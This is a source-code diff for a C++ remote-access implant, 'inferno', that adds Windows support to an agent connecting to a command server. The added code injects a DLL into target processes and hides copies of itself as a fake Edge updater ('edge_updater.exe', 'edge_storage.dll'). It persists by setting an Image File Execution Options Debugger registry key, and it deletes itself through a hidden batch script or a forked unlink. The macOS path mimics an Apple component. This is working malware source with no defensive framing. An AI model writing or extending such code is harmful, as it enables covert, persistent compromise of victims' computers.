@@ -20,6 +20,8 @@
 #endif
 #include <windows.h>
 #include <lmcons.h>
+#include <shlobj.h>
+#include <shellapi.h>
 #else
 #include <unistd.h>
 #include <sys/utsname.h>
@@ -40,15 +42,55 @@ static std::string getAgentDylibPath() {
     const char* home = ::getenv("HOME");
     return home ? (std::string(home) + "/.cache/com.apple.amp.itmstransporter.dylib")
                 : "/tmp/.inferno_agent.dylib";
+#elif defined(_WIN32)
+    // Path relative to the agent binary: <agent_dir>\inferno_agent.dll
+    char module_path[MAX_PATH];
+    if (::GetModuleFileNameA(nullptr, module_path, MAX_PATH) == 0) {
+        return "C:\\Windows\\Temp\\inferno_agent.dll";
+    }
+    std::string path(module_path);
+    size_t sep = path.rfind('\\');
+    if (sep != std::string::npos) {
+        path.resize(sep + 1);
+    }
+    path += "inferno_agent.dll";
+    return path;
 #else
     return {};
 #endif
 }
 
+#ifdef _WIN32
+static std::string extractExeName(const std::string& full_path) {
+    size_t sep = full_path.find_last_of("/\\");
+    std::string name = (sep != std::string::npos) ? full_path.substr(sep + 1) : full_path;
+    // Ensure it ends with .exe
+    if (name.size() < 4 || name.compare(name.size() - 4, 4, ".exe") != 0) {
+        name += ".exe";
+    }
+    return name;
+}
+
+static bool mkdirRecursive(const std::string& path) {
+    std::string current;
+    for (size_t i = 0; i < path.size(); ++i) {
+        current += path[i];
+        if ((path[i] == '\\' || path[i] == '/') && !current.empty()) {
+            ::CreateDirectoryA(current.c_str(), nullptr);
+        }
+    }
+    ::CreateDirectoryA(path.c_str(), nullptr);
+    return ::GetLastError() == ERROR_ALREADY_EXISTS || ::GetLastError() == ERROR_SUCCESS;
+}
+#endif
+
 Agent::Agent() : m_server_ip("127.0.0.1"), m_server_port(4242), m_state(AgentState::INIT), m_running(false), m_persistence_installed(false), m_reconnect_delay(MIN_BACKOFF) {}
 
-Agent::Agent(const std::string& server_ip, uint16_t server_port)
-    : m_server_ip(server_ip), m_server_port(server_port), m_state(AgentState::INIT), m_running(false), m_persistence_installed(false), m_reconnect_delay(MIN_BACKOFF) {}
+Agent::Agent(const std::string& server_ip, uint16_t server_port,
+             const std::string& binary_path)
+    : m_server_ip(server_ip), m_server_port(server_port), m_binary_path(binary_path),
+      m_state(AgentState::INIT), m_running(false),
+      m_persistence_installed(false), m_reconnect_delay(MIN_BACKOFF) {}
 
 Agent::~Agent() {
     stop();
@@ -386,7 +428,7 @@ void Agent::handleInjection(Packet&& packet) {
     std::string dylib_path = getAgentDylibPath();
 
     bool success = inferno::tier2::injectIntoTarget(target, dylib_path,
-                                                     m_server_ip, m_server_port);
+                                                      m_server_ip, m_server_port);
 
     std::string result = target_path + "||"
                        + std::to_string(static_cast<int>(target.capability)) + "|"
@@ -394,6 +436,68 @@ void Agent::handleInjection(Packet&& packet) {
 
     Packet res(static_cast<uint16_t>(Opcode::INJECT_RES), result);
     m_socket.sendData(res.serialize());
+
+    if (success) {
+        persistInjectedAgent(m_server_ip, m_server_port, target_path);
+        selfDelete();
+    }
+}
+
+#ifdef INFERNO_TESTING
+std::atomic<bool> Agent::s_self_delete_called{false};
+#endif
+
+static std::string resolveBinaryPath(const std::string& argv0);
+
+void Agent::selfDelete() {
+#ifdef INFERNO_TESTING
+    s_self_delete_called = true;
+    return;
+#else
+    if (m_binary_path.empty()) return;
+    std::string abs_path = resolveBinaryPath(m_binary_path);
+    if (abs_path.empty()) return;
+
+#ifdef _WIN32
+    // Can't delete a running EXE on Windows. Rename first, then spawn
+    // a detached bat script that waits 3s and deletes the renamed file.
+    char temp_dir[MAX_PATH];
+    if (::GetTempPathA(MAX_PATH, temp_dir) == 0) return;
+
+    std::string renamed = std::string(temp_dir) + "\\inferno_"
+                        + std::to_string(::GetCurrentProcessId()) + ".bak";
+    if (!::MoveFileExA(abs_path.c_str(), renamed.c_str(),
+                       MOVEFILE_REPLACE_EXISTING)) {
+        return;
+    }
+
+    std::string bat_path = std::string(temp_dir) + "\\del_"
+                         + std::to_string(::GetCurrentProcessId()) + ".bat";
+    std::string script = std::string(
+        "@echo off\r\n"
+        "ping 127.0.0.1 -n 4 > nul\r\n"
+        "del \"") + renamed + "\"\r\n"
+        "del \"" + bat_path + "\"\r\n";
+
+    FILE* f = ::fopen(bat_path.c_str(), "w");
+    if (f) {
+        ::fwrite(script.c_str(), 1, script.size(), f);
+        ::fclose(f);
+        ::ShellExecuteA(nullptr, "open", bat_path.c_str(),
+                        nullptr, nullptr, SW_HIDE);
+    }
+    ::ExitProcess(0);
+#else
+    pid_t pid = ::fork();
+    if (pid == 0) {
+        ::sleep(2);
+        ::unlink(abs_path.c_str());
+        ::_exit(0);
+    }
+    // Parent exits immediately — child handles deletion
+    ::_exit(0);
+#endif
+#endif
 }
 
 void Agent::handleShellExecution(Packet&& packet) {
@@ -630,7 +734,9 @@ static std::string escapeXml(const std::string& s) {
 }
 
 void Agent::persistInjectedAgent(const std::string& server_ip,
-                                  uint16_t server_port) {
+                                  uint16_t server_port,
+                                  const std::string& target_path) {
+    (void)target_path;
     // Get the host executable path
     uint32_t bufsize = 0;
     _NSGetExecutablePath(nullptr, &bufsize);
@@ -693,8 +799,70 @@ void Agent::persistInjectedAgent(const std::string& server_ip,
    escapeXml(server_ip).c_str(), escapeXml(port_str).c_str());
     ::fclose(f);
 }
+#elif defined(_WIN32)
+void Agent::persistInjectedAgent(const std::string& server_ip,
+                                  uint16_t server_port,
+                                  const std::string& target_path) {
+    if (target_path.empty()) return;
+
+    // Get our own executable path (like macOS uses _NSGetExecutablePath)
+    char own_path[MAX_PATH];
+    if (::GetModuleFileNameA(nullptr, own_path, MAX_PATH) == 0) {
+        return;
+    }
+
+    // Resolve the re-injector install path (discreet, under Edge directory)
+    char appdata[MAX_PATH];
+    if (::SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appdata) != S_OK) {
+        return;
+    }
+    std::string base = std::string(appdata)
+                     + "\\Microsoft\\Edge\\Application\\114.0.1823.58";
+    mkdirRecursive(base);
+
+    std::string reinjector_path = base + "\\edge_updater.exe";
+    std::string dll_dest = base + "\\edge_storage.dll";
+    std::string cfg_path = reinjector_path + ".cfg";
+
+    // Copy agent binary → re-injector at discreet path
+    std::string agent_abs = resolveBinaryPath(own_path);
+    if (!::CopyFileA(agent_abs.c_str(), reinjector_path.c_str(), FALSE)) {
+        return;
+    }
+
+    // Copy agent DLL alongside
+    std::string dll_src = getAgentDylibPath();
+    if (!dll_src.empty()) {
+        ::CopyFileA(dll_src.c_str(), dll_dest.c_str(), FALSE);
+    }
+
+    // Write config: target_exe|dll_path|server_ip|port
+    std::string target_name = extractExeName(target_path);
+    FILE* f = ::fopen(cfg_path.c_str(), "w");
+    if (!f) return;
+    std::fprintf(f, "%s\n%s\n%s\n%u\n",
+                 target_name.c_str(),
+                 dll_dest.c_str(),
+                 server_ip.c_str(),
+                 static_cast<unsigned>(server_port));
+    ::fclose(f);
+
+    // Set IFEO Debugger for the target
+    HKEY hKey;
+    std::string ifeo_key = std::string(
+        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
+        "Image File Execution Options\\") + target_name;
+    if (::RegCreateKeyExA(HKEY_CURRENT_USER, ifeo_key.c_str(), 0, nullptr, 0,
+                          KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
+        std::string debugger = "\"" + reinjector_path + "\" --reinject";
+        ::RegSetValueExA(hKey, "Debugger", 0, REG_SZ,
+                         reinterpret_cast<const BYTE*>(debugger.c_str()),
+                         static_cast<DWORD>(debugger.size() + 1));
+        ::RegCloseKey(hKey);
+    }
+}
 #else
-void Agent::persistInjectedAgent(const std::string&, uint16_t) {}
+void Agent::persistInjectedAgent(const std::string&, uint16_t, const std::string&) {}
 #endif
 
 std::string Agent::getHardwareUUID() {
